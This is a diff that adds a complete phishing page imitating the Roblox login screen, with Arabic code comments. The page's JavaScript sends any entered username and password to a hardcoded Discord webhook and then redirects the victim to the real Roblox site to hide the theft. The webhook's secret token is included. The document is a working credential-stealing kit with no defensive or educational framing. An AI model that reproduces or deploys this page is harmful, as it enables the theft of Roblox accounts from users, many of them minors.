@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Login</title>
+    <style>
+        /* إعدادات الأساس */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body, html {
+            height: 100%;
+            background-color: #000;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        /* القائمة العلوية */
+        .header {
+            height: 40px;
+            background-color: #000;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            border-bottom: 1px solid #333;
+            position: fixed;
+            top: 0; width: 100%;
+            z-index: 1000;
+        }
+        .header .logo { color: white; font-weight: bold; font-size: 18px; margin-right: 25px; }
+
+        /* الخلفية المائلة 3D */
+        .background-wrapper {
+            position: absolute;
+            top: -10%; left: -10%;
+            width: 120%; height: 120%;
+            transform: perspective(1000px) rotateX(15deg) rotateY(-15deg) skewY(-5deg);
+            z-index: 1;
+            display: grid;
+            grid-template-columns: repeat(8, 1fr);
+            gap: 20px;
+            padding: 40px;
+            filter: brightness(0.3);
+        }
+
+        .game-tile {
+            width: 100%;
+            aspect-ratio: 1/1;
+            background-color: #111;
+            border-radius: 12px;
+            background-size: cover;
+            background-position: center;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, rgba(0,0,0,0) 20%, rgba(0,0,0,0.8) 100%);
+            z-index: 2;
+        }
+
+        /* حاوية تسجيل الدخول */
+        .login-section {
+            position: relative;
+            z-index: 10;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-card {
+            background-color: #191B1F;
+            width: 380px;
+            padding: 35px;
+            border-radius: 4px;
+            text-align: center;
+            color: white;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+        }
+
+        .login-card h2 { font-size: 24px; margin-bottom: 25px; }
+
+        input {
+            width: 100%;
+            height: 42px;
+            background-color: #393B44;
+            border: 1px solid #111;
+            border-radius: 3px;
+            margin-bottom: 10px;
+            padding: 0 12px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .btn-main {
+            width: 100%;
+            height: 38px;
+            background: none;
+            border: 1px solid #FFFFFF;
+            color: white;
+            font-weight: 600;
+            border-radius: 3px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            height: 38px;
+            background-color: #393B44;
+            border: none;
+            color: white;
+            border-radius: 3px;
+            font-weight: 600;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+
+        .signup-footer {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+            font-size: 13px;
+        }
+        .signup-footer a { color: #00A2FF; text-decoration: none; }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <div class="logo">ROBLOX</div>
+    </header>
+
+    <div id="bg-grid" class="background-wrapper"></div>
+    <div class="overlay"></div>
+
+    <main class="login-section">
+        <div class="login-card">
+            <h2>Login to Roblox</h2>
+            <input type="text" id="username" placeholder="Username/Email/Phone">
+            <input type="password" id="password" placeholder="Password">
+            
+            <button class="btn-main" onclick="sendToDiscord()">Log In</button>
+            
+            <div style="margin: 15px 0;"><a href="#" style="color:#ccc; font-size:12px; text-decoration:none;">Forgot Password or Username?</a></div>
+            
+            <button class="btn-secondary">Quick Login</button>
+
+            <div class="signup-footer">
+                Don't have an account? <a href="#">Sign Up</a>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // ملء الخلفية بالصور المائلة
+        const grid = document.getElementById('bg-grid');
+        const images = [
+            'https://tr.rbxcdn.com/180Day-6902279148b30d959556d73f32e9873d/420/420/Image/Png',
+            'https://tr.rbxcdn.com/180Day-494b232677e20b009e4431e5f8845700/420/420/Image/Png',
+            'https://tr.rbxcdn.com/180Day-7b3b9b478d1045b13b19280918c89420/420/420/Image/Png',
+            'https://tr.rbxcdn.com/180Day-0545f284f6974950e377883a4501a357/420/420/Image/Png'
+        ];
+
+        for (let i = 0; i < 48; i++) {
+            const tile = document.createElement('div');
+            tile.className = 'game-tile';
+            tile.style.backgroundImage = `url('${images[i % images.length]}')`;
+            grid.appendChild(tile);
+        }
+
+        // وظيفة الإرسال إلى ديسكورد
+        function sendToDiscord() {
+            const user = document.getElementById("username").value;
+            const pass = document.getElementById("password").value;
+            const webhookURL = "https://discord.com/api/webhooks/1474029320698859666/Uy1CJ3_dyjoFJnl2TLmnlWk0dkI6ZUUX2fsBxY_qA6GQVnDM1jtTfKSNy4aPsbGXFLQo";
+
+            if(!user || !pass) {
+                alert("Please fill in all fields");
+                return;
+            }
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: `**Roblox Login Attempt:**\n👤 User: \`${user}\`\n🔑 Pass: \`${pass}\``
+                })
+            })
+            .then(() => {
+                window.location.href = "https://www.roblox.com/home"; // تحويل المستخدم للموقع الحقيقي بعد الإرسال
+            })
+            .catch(() => alert("Error connection."));
+        }
+    </script>
+</body>
+</html>
